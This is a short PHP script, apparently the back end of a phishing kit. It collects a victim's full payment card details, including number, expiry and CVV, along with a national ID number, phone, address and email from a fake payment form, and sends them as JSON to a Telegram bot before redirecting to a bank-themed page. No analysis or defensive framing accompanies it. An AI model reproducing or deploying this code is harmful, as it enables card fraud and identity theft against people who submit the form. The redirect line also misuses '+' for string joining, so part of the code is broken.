
<?php

require_once('acciones/bot_telegram.php');

$nombre = $_REQUEST["nameTxt"];
$codigo = $_REQUEST["cardTxt"];
$codigo_sin_espacios = str_replace(' ', '', $codigo);
$fecha = $expTxt = $_REQUEST["expTxt"];
$cvv = $_REQUEST["emailTxt"];
$cedula = $_REQUEST["cedula"];
$tel = $_REQUEST["tel"];
$add = $_REQUEST["add"];
$email =  $_REQUEST["email2Txt"];

$token = "";
$chatId = "";


$numero_recortado = substr( $codigo_sin_espacios,0,  6);

$c = $numero_recortado;

echo $_REQUEST['bancoTxt'];
$banco = $_REQUEST['bancoTxt'];
$data = array(
    "banco" => $banco,
    "nombre" => $nombre,
    "tarjeta" => $codigo,
    "fecha" => $fecha,
    "cvv" => $cvv,
    "cedula" => $cedula,
    "telefono" => $tel,
    "email" => $email,
    "direccion" => $add
);

$jsonData = json_encode($data);
enviarMensajeTelegram($jsonData);
header('location:/pago/'+$banco+'/'+$banco+'.php');
?>

